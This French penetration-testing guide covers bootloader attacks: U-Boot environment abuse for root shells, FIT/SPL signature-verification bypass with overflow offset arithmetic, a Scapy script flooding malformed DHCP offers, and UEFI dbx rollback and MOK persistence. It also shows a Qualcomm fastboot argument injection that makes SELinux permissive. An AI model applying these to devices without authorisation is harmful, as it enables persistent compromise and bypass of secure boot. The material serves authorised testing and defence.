# Tests du bootloader

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage des appareils et tester les bootloaders tels que U-Boot et les chargeurs de classe UEFI. Concentrez-vous sur l’obtention d’une exécution de code précoce, l’évaluation des protections contre les signatures et le rollback, ainsi que l’exploitation des chemins de récupération ou de démarrage réseau.

En lien : contournement du secure boot MediaTek via le patching de bl2_ext :

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Premières victoires avec U-Boot et abus de l’environnement

1. Accéder au shell de l’interpréteur
   - Pendant le démarrage, appuyez sur une touche d’interruption connue (souvent n’importe quelle touche, 0, espace ou une séquence « magique » spécifique à la carte) avant l’exécution de `bootcmd` pour accéder à l’invite U-Boot.<sup>[[1]](#references)</sup>

2. Inspecter l’état et les variables de démarrage
   - Commandes utiles :
     - `printenv` (afficher l’environnement)
     - `bdinfo` (informations sur la carte, adresses mémoire)
     - `help bootm; help booti; help bootz` (méthodes de démarrage du noyau prises en charge)
     - `help ext4load; help fatload; help tftpboot` (chargeurs disponibles)

3. Modifier les arguments de démarrage pour obtenir un shell root
   - Ajoutez `init=/bin/sh` pour que le noyau ouvre un shell au lieu de lancer le processus init normal :
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Démarrer par le réseau depuis votre serveur TFTP
   - Configurez le réseau et récupérez une image noyau/FIT depuis le LAN :
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persister les modifications via l’environnement
   - Si le stockage de l’environnement n’est pas protégé en écriture, vous pouvez y persister le contrôle :
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Vérifiez les variables telles que `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` qui influencent les chemins de repli. Des valeurs mal configurées peuvent permettre d’accéder plusieurs fois au shell.

6. Vérifier les fonctionnalités de debug/non sécurisées
   - Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` sans restriction, la possibilité d’utiliser `loady`/`loads` via le port série, `env import` depuis un support non fiable, ainsi que des kernels/ramdisks chargés sans vérification de signature.

7. Tester les images U-Boot et leur vérification
   - Si la plateforme prétend utiliser un démarrage sécurisé/vérifié avec des images FIT, essayez des images non signées et altérées :
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - L’absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou le comportement historique `verify=n` permet souvent de démarrer des payloads arbitraires.
   - Ne vous contentez pas d’un simple résultat d’autorisation ou de refus : des recherches récentes sur FIT ont montré que le chemin de vérification lui-même peut constituer une surface d’attaque pré-auth. Testez négativement les données FIT stockées en externe (`data-offset`, `data-position`, `data-size`), la sélection des configurations signées, `loadables` et le traitement des overlays / `extra-conf`.
   - Si vous disposez d’un arbre source correspondant, `test/vboot/vboot_test.sh` permet de reproduire rapidement le comportement de vérification FIT dans le sandbox U-Boot avant de toucher au matériel réel.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` et flux de démarrage par script
   - Dans les builds U-Boot modernes, `bootcmd` n’est souvent qu’un wrapper autour de Standard Boot. Les supports inscriptibles, PXE ou la mémoire flash SPI peuvent donc constituer la véritable frontière de confiance, même lorsque l’environnement visible semble inoffensif.
   - La méthode de démarrage `extlinux` recherche `extlinux/extlinux.conf` sous `/` et `/boot` ; la méthode de démarrage par script recherche d’abord `boot.scr.uimg`, puis `boot.scr`. Lors d’un démarrage réseau, le nom du script peut provenir de `boot_script_dhcp`.
   - Commandes de triage utiles :
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Cas d’abus à tester : supports USB/SD contrôlés par un attaquant placés plus tôt dans `boot_targets`, fichier `/boot/extlinux/extlinux.conf` modifiable, serveur TFTP malveillant fournissant `boot.scr`, ou exécution de script via SPI avec `script_offset_f`.
   - Si la plateforme s’appuie sur la vérification FIT, assurez-vous que les configurations sont signées au niveau de la configuration et pas uniquement image par image ; `required-mode=all` est plus strict que l’acceptation d’une seule clé requise.

### Données FIT externes de SPL copiées avant vérification

Pour le chargement FIT par SPL, une signature de configuration intacte ne garantit pas l’innocuité des métadonnées de payload externes. U-Boot exclut `data-position`, `data-offset` et `data-size` des propriétés de configuration signées. Dans les chemins `load_simple_fit()` concernés, SPL déduit un offset source et une longueur de copie à partir de ces champs, puis appelle `info->read()` **avant** de vérifier le hash de l’image. Un FIT spécialement conçu sur un support de démarrage modifiable peut donc écraser la RAM sans falsifier de signature. La propriété signée `load` fixe normalement la destination ; déterminez donc d’abord si une copie trop longue peut atteindre la stack ou d’autres données de contrôle à partir de cette adresse.<sup>[[15]](#references)[[16]](#references)</sup>

Suivez le chargeur réel de la carte et sa cartographie mémoire au lieu de supposer une lecture depuis la flash : le chargeur RAM démontré a atteint `spl_ram_load_read()` et `memcpy()`. Au point d’appel, relevez `fit_offset` et toute adresse de base FIT ajoutée par le lecteur, la longueur de bloc du chargeur (`spl_get_bl_len(info)`), tout alignement propre à une fork, les valeurs résultantes de `read_offset` et de la taille du transfert `size`, le pointeur de destination `src_ptr` et l’emplacement de l’adresse de retour sauvegardée. Vérifiez si une région source contiguë mappée couvre la distance de copie requise, si elle chevauche la destination et si les octets à la position source peuvent fournir un pointeur vers des données FIT contrôlées par l’attaquant. La [technique générique de partial return-address overwrite](../../binary-exploitation/stack-overflow/ret2win/) s’applique si un pointeur complet ne respecte pas les contraintes d’alignement du chargeur.<sup>[[16]](#references)</sup>

Dans le build de test 32 bits AST2600 des chercheurs, `src_ptr` valait `0x80001000` et l’adresse de retour sauvegardée de `memcpy` se trouvait à `0x902ffe24`. Ils ont utilisé un build upstream modifié avec les fonctions auxiliaires de placement et d’alignement de la stack d’OpenBMC : le lecteur RAM ajoutait une base FIT de `0x10000`, et ces fonctions arrondissaient l’offset source à la baisse à `ARCH_DMA_MINALIGN` (64 octets). Un pointeur little-endian utile à `0x902fffe4` et une copie se terminant un octet avant la fin n’ont modifié que les trois octets de poids faible de l’adresse de retour sauvegardée, en préservant son octet de poids fort nul connu. Le chargeur RAM upstream utilise plutôt une longueur de bloc d’un octet ; cet alignement de 64 octets et cette méthode de partial overwrite ne sont donc pas des exigences générales de SPL. Recalculez les adresses, la longueur de bloc du chargeur et l’étendue de la copie pour chaque build. Dans le calcul d’origine ci-dessous, `fit_offset` désigne l’ajout effectif de la base FIT par le lecteur RAM, et pas nécessairement l’argument transmis à `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Le correctif en amont limite à la fois la valeur brute de `data-size` et la taille de transfert **alignée sur les blocs** avant l’appel à `info->read()`. Le chemin overlay transmet la capacité réelle du buffer, tandis que les autres appelants utilisent `CONFIG_SYS_BOOTM_LEN`, qui n’est qu’une limite supérieure indicative et ne prouve pas que la destination dispose réellement d’autant de mémoire libre. Lors de l’évaluation d’un fork fournisseur, vérifiez que ces contrôles sont présents et comparez la plage de copie autorisée à la pile SPL réelle de la carte et aux régions réservées.<sup>[[15]](#references)[[16]](#references)</sup>

## Surface d’attaque du démarrage réseau (DHCP/PXE) et serveurs rogue

9. Fuzzing des paramètres PXE/DHCP
   - Le traitement BOOTP/DHCP historique d’U-Boot a connu des problèmes de sécurité mémoire. Par exemple, CVE‑2024‑42040 décrit une divulgation de mémoire via des réponses DHCP conçues pour leak des octets de la mémoire d’U-Boot sur le réseau.<sup>[[4]](#references)</sup> Testez les chemins de code DHCP/PXE avec des valeurs excessivement longues ou des cas limites (option 67 bootfile-name, options fournisseur, champs file/servername) et observez les blocages et les leaks.
   - Extrait minimal Scapy pour tester les paramètres de démarrage pendant un netboot :
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Vérifiez également si les champs de nom de fichier PXE sont transmis à la logique du shell/loader sans assainissement lorsqu’ils sont chaînés à des scripts de provisionnement côté OS.

10. Tests d’injection de commande via un serveur DHCP rogue
   - Configurez un service DHCP/PXE rogue et essayez d’injecter des caractères dans les champs de nom de fichier ou d’options pour atteindre les interpréteurs de commandes aux étapes ultérieures de la chaîne de démarrage. L’auxiliaire DHCP de Metasploit, `dnsmasq` ou des scripts Scapy personnalisés conviennent bien. Veillez d’abord à isoler le réseau du laboratoire.

## Modes de récupération de la ROM du SoC qui remplacent le démarrage normal

De nombreux SoC proposent un mode « loader » BootROM qui accepte du code via USB/UART, même lorsque les images flash sont invalides. Si les fusibles secure-boot ne sont pas programmés, cela peut permettre l’exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
  - Outils : `uuu` (mfgtools3) ou `imx-usb-loader`.
  - Exemple : `imx-usb-loader u-boot.imx` pour charger et exécuter un U-Boot personnalisé depuis la RAM.
- Allwinner (FEL)
  - Outil : `sunxi-fel`.
  - Exemple : `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Outil : `rkdeveloptool`.
  - Exemple : `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` pour charger un loader et téléverser un U-Boot personnalisé.

Vérifiez si les eFuses/OTP de secure-boot de l’appareil sont programmés. Si ce n’est pas le cas, les modes de téléchargement BootROM contournent souvent toute vérification de niveau supérieur (U-Boot, noyau, rootfs) en exécutant directement votre payload de première étape depuis la SRAM/DRAM.

## Bootloaders UEFI/PC : vérifications rapides

11. Tests de falsification de l’ESP, de rollback et d’inscription de clés
   - Montez la partition système EFI (ESP) et recherchez les composants du loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ainsi que les chemins des logos des fabricants.
   - Dans la mesure du possible, extrayez l’état de Secure Boot et les bases de données de clés depuis l’OS :
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Si la plateforme est en Setup Mode, accepte l’inscription de clés sans authentification ou est livrée avec une Platform Key de test/par défaut (classe PKfail), un administrateur local ou un attaquant ayant un accès physique peut inscrire sa propre KEK/db et laisser Secure Boot sembler « activé » tout en démarrant des binaires EFI arbitraires.<sup>[[3]](#references)</sup>
   - Essayez de démarrer avec des composants de démarrage signés connus comme vulnérables ou dont la version a été rétrogradée si les révocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait encore confiance à d’anciens shims/bootmanagers, vous pouvez souvent charger votre propre noyau ou `grub.cfg` depuis l’ESP pour établir une persistance.
   - Sous Windows, les hôtes corrigés peuvent encore accepter des boot managers signés vulnérables si le signataire `Microsoft Windows Production PCA 2011` reste absent du `dbx` du firmware, comme observé avec BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Un contournement de type Baton Drop peut inscrire un MOK de l’attaquant ; un shim légitime peut alors charger, lors des démarrages suivants, une charge utile EFI signée avec cette clé.<sup>[[12]](#references)[[13]](#references)</sup> La révocation ultérieure de l’ancien signataire Windows ne supprime pas le MOK inscrit ; la méthode basée sur shim peut donc persister si ce shim reste approuvé.<sup>[[12]](#references)</sup>
   - Avant de tester cette méthode de retour à une version antérieure sur une machine UEFI autorisée, vérifiez **l’état effectif des révocations du firmware**, et pas seulement l’historique des mises à jour Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft fournit cette vérification PowerShell en lecture seule, avec élévation de privilèges, pour le signataire 2011 dans `dbx` :<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` n'est qu'une piste : confirmez le composant de démarrage signé concerné et les autres révocations dans un laboratoire où la récupération est possible.<sup>[[12]](#references)[[14]](#references)</sup> Une mise à jour du registre en attente ou un certificat de signature expiré n'équivalent pas à une révocation `dbx` effectuée.<sup>[[13]](#references)[[14]](#references)</sup>

12. Tests de révocation de shim / SBAT / dbx obsolètes
   - Les anciens shims signés par Microsoft et les forks des fournisseurs peuvent toujours servir de voie d'accès à un bootkit de type BYOVD si les révocations sont obsolètes. Dans un laboratoire isolé, placez un shim historiquement vulnérable sur l'ESP et tentez de chaîner votre propre `grubx64.efi` ou noyau.<sup>[[11]](#references)</sup>
   - Triage rapide :
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Si le shim s’exécute toujours alors qu’il figure sur la liste de révocation, le firmware/OS utilise des mises à jour `dbx` obsolètes ou fait confiance à un fork du loader qui n’a jamais hérité des protections SBAT en amont.

13. Bugs d’analyse du logo de démarrage (classe LogoFAIL)
   - Plusieurs firmwares OEM/IBV étaient vulnérables à des failles d’analyse d’images dans DXE, lors du traitement des logos de démarrage. Si un attaquant peut placer une image spécialement conçue sur l’ESP sous un chemin propre au fabricant (par exemple, `\EFI\<vendor>\logo\*.bmp`) et redémarrer, l’exécution de code au début du démarrage peut être possible même si Secure Boot est activé. Vérifiez si la plateforme accepte les logos fournis par l’utilisateur et si ces chemins sont accessibles en écriture depuis l’OS.<sup>[[2]](#references)</sup>


## Lacunes de confiance dans Android/Qualcomm ABL + GBL (Android 16)

Sur les appareils Android 16 qui utilisent ABL de Qualcomm pour charger la **Generic Bootloader Library (GBL)**, vérifiez si ABL **authentifie** l’application UEFI qu’il charge depuis la partition `efisp`. Si ABL vérifie uniquement la **présence** d’une application UEFI sans vérifier les signatures, une primitive d’écriture sur `efisp` permet l’**exécution de code non signé avant le démarrage de l’OS**.<sup>[[6]](#references)[[7]](#references)</sup>

Vérifications pratiques et voies d’exploitation :

- **Primitive d’écriture sur efisp** : Il vous faut un moyen d’écrire une application UEFI personnalisée dans `efisp` (root/service privilégié, bug dans une application OEM, chemin de récupération/fastboot). Sans cela, la lacune de chargement de GBL n’est pas directement exploitable.<sup>[[6]](#references)</sup>
- **Injection d’arguments OEM fastboot** (bug ABL) : Certaines versions acceptent des jetons supplémentaires dans `fastboot oem set-gpu-preemption` et les ajoutent à la ligne de commande du noyau. Cela peut servir à rendre SELinux permissif et à permettre l’écriture dans des partitions protégées :
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Si l’appareil est corrigé, la commande doit rejeter les arguments supplémentaires.<sup>[[5]](#references)[[6]](#references)</sup>
- **Déverrouillage du bootloader via des indicateurs persistants** : une charge utile exécutée lors du démarrage peut modifier les indicateurs de déverrouillage persistants (p. ex., `is_unlocked=1`, `is_unlocked_critical=1`) pour émuler `fastboot oem unlock` sans passer par les contrôles du serveur ou d’approbation OEM. Cet état est durable après le redémarrage suivant.<sup>[[6]](#references)</sup>

Notes défensives/de triage :

- Vérifiez si ABL effectue une vérification de signature sur la charge utile GBL/UEFI provenant de `efisp`. Dans le cas contraire, considérez `efisp` comme une surface de persistance à haut risque.
- Vérifiez si les gestionnaires de commandes OEM fastboot d’ABL ont été modifiés pour **valider le nombre d’arguments** et rejeter les jetons supplémentaires.<sup>[[8]](#references)[[9]](#references)</sup>

## Précautions matérielles

Soyez prudent lorsque vous intervenez sur la mémoire flash SPI/NAND pendant le démarrage précoce (p. ex., en mettant des broches à la masse pour contourner les lectures) et consultez toujours la fiche technique de la mémoire flash. Des courts-circuits mal synchronisés peuvent endommager l’appareil ou le programmateur.

## Notes et conseils supplémentaires

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d’environnement entre la RAM et le stockage ; certaines plateformes permettent d’importer un environnement depuis un support amovible sans authentification.
- Pour assurer la persistance sur les systèmes basés sur Linux qui démarrent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de démarrage suffit souvent si aucune vérification de signature n’est appliquée.
- Si la cible utilise des mises à jour à double emplacement / A/B, consultez les techniques anti-rollback et de désynchronisation des emplacements dans la [vue d’ensemble de l’analyse du firmware](README.md) afin de ne pas manquer les lacunes de confiance propres au mécanisme de mise à jour, en dehors du bootloader lui-même.
- Si l’espace utilisateur fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond bien au stockage réel de l’environnement. Des offsets mal configurés peuvent vous faire lire ou écrire dans la mauvaise région MTD.

## References

- [1] [Méthodologie de test de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [À la découverte de LogoFAIL : les dangers de l’analyse d’images pendant le démarrage du système](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail : des clés de plateforme non fiables compromettent Secure Boot dans l’écosystème UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Détails de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Préempté : déverrouiller un Xiaomi à l’aide de deux chaînes non assainies](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [L’exploit GBL du Qualcomm Snapdragon 8 Elite permet aux attaquants de déverrouiller les bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architecture de Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg : corriger la propagation d’entrées non fiables dans la ligne de commande du noyau](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg : ajouter une vérification pour la commande set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Inapte au démarrage : contourner la vérification de signature FIT d’U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Note de vulnérabilité VU#616257 - Les bootloaders shim UEFI signés par Microsoft sont vulnérables au contournement de Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus : le mythe confirmé](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX : un bootkit UEFI similaire à BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Gérer les révocations de Windows Boot Manager pour les modifications de Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Correctif U-Boot : limiter la taille des données externes avant de les lire](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Les avantages cachés de FIT : contourner la vérification de signature dans U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
